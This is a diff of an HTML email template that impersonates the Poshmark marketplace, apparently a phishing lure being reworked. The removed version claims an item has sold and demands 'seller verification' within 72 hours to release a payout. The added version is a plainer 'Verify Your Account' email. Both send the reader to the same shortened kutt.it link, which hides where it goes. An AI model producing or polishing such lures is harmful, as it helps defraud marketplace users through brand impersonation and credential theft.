@@ -1,120 +1,126 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your Item Has Been Sold on PoShmark</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
-            color: #333;
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f9f9f9;
-        }
-        .header {
-            background-color: #e21b70;
-            color: white;
-            padding: 20px;
-            text-align: center;
-            border-radius: 8px 8px 0 0;
-        }
-        .content {
-            background-color: white;
-            padding: 30px;
-            border-radius: 0 0 8px 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-        .button {
-            display: inline-block;
-            background-color: #e21b70;
-            color: white;
-            padding: 14px 28px;
-            text-decoration: none;
-            border-radius: 6px;
-            font-weight: bold;
-            margin: 20px 0;
-            text-align: center;
-            transition: background-color 0.3s;
-        }
-        .button:hover {
-            background-color: #c4165f;
-        }
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #777;
-            text-align: center;
-            border-top: 1px solid #eee;
-            padding-top: 15px;
-        }
-        .highlight {
-            background-color: #fff9e6;
-            padding: 15px;
-            border-left: 4px solid #ffcc00;
-            margin: 20px 0;
-            border-radius: 4px;
-        }
-        .steps {
-            background-color: #f5f5f5;
-            padding: 15px;
-            border-radius: 6px;
-            margin: 25px 0;
-        }
-        .steps ol {
-            margin: 10px 0;
-            padding-left: 20px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Account Verification Required</title>
+<style>
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    line-height: 1.5;
+    color: #333;
+    margin: 0;
+    padding: 20px;
+    background-color: #f9f9f9;
+}
+.container {
+    max-width: 500px;
+    margin: 0 auto;
+    background: white;
+    border-radius: 8px;
+    padding: 30px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+}
+.header {
+    text-align: center;
+    margin-bottom: 25px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #eee;
+}
+h1 {
+    color: #e03c7e;
+    font-size: 22px;
+    margin: 0 0 10px 0;
+    font-weight: 600;
+}
+.message {
+    margin-bottom: 25px;
+    color: #444;
+    font-size: 15px;
+}
+.action-box {
+    background: #f8f8f8;
+    padding: 20px;
+    border-radius: 6px;
+    margin: 25px 0;
+    text-align: center;
+    border: 1px solid #eee;
+}
+.verify-btn {
+    display: inline-block;
+    background: #e03c7e;
+    color: white;
+    padding: 14px 28px;
+    border-radius: 6px;
+    text-decoration: none;
+    font-weight: 500;
+    font-size: 15px;
+}
+.verify-btn:hover {
+    background: #d02a6d;
+}
+.link-text {
+    margin-top: 15px;
+    font-size: 13px;
+    color: #666;
+    word-break: break-all;
+    padding: 10px;
+    background: white;
+    border-radius: 4px;
+    border: 1px solid #eaeaea;
+}
+.note {
+    font-size: 13px;
+    color: #777;
+    text-align: center;
+    margin-top: 20px;
+    padding-top: 15px;
+    border-top: 1px solid #eee;
+}
+.footer {
+    margin-top: 30px;
+    font-size: 12px;
+    color: #999;
+    text-align: center;
+    padding-top: 15px;
+    border-top: 1px solid #eee;
+}
+@media (max-width: 600px) {
+    body { padding: 10px; }
+    .container { padding: 20px; }
+    h1 { font-size: 20px; }
+}
+</style>
 </head>
 <body>
+<div class="container">
     <div class="header">
-        <h1>🎉 Congratulations on Your Sale!</h1>
+        <h1>Verify Your Account</h1>
     </div>
     
-    <div class="content">
-        <h2>Notification from PoShmark</h2>
-        
-        <p>Hello!</p>
-        
-        <p>We're excited to inform you that your item has been successfully sold to a buyer.</p>
-        
-        <div class="highlight">
-            <p><strong>⚠️ Important:</strong> To receive your payout, you need to complete seller verification. This is a standard security procedure that takes only a few minutes.</p>
-        </div>
-        
-        <div class="steps">
-            <h3>Payout Process:</h3>
-            <ol>
-                <li>Complete seller verification</li>
-                <li>Confirm sale details</li>
-                <li>Ship the item to the buyer</li>
-                <li>Receive payout after delivery</li>
-            </ol>
-        </div>
-        
-        <p>Click the button below to start the verification process and receive your payout:</p>
-        
-        <div style="text-align: center;">
-            <a href="https://kutt.it/RduqC2" class="button">
-                🔒 COMPLETE VERIFICATION FOR PAYOUT
-            </a>
-        </div>
-        
-        <p><strong>Time limit:</strong> Verification must be completed within 72 hours of the sale.</p>
-        
-        <p>If you have any questions, our support team is ready to assist you.</p>
-        
-        <p>Best regards,<br>
-        <strong>The PoShmark Team</strong></p>
-        
-        <div class="footer">
-            <p>This email was sent automatically. Please do not reply.</p>
-            <p>© 2023 PoShmark. All rights reserved.</p>
-            <p>1234 Marketplace Ave, Suite 567, San Francisco, CA 94107</p>
-        </div>
+    <div class="message">
+        <p>Hello,</p>
+        <p>Please confirm your email address to access your account features.</p>
+        <p>This helps us maintain account security and provide you with full service access.</p>
     </div>
+    
+    <div class="action-box">
+        <a href="https://kutt.it/RduqC2" class="verify-btn">
+            Confirm Email Address
+        </a>
+        
+
+    </div>
+    
+    <div class="note">
+        This link is valid for 24 hours.<br>
+        
+    </div>
+    
+    <div class="footer">
+        <p>© Poshmark</p>
+ 
+    </div>
+</div>
 </body>
 </html>
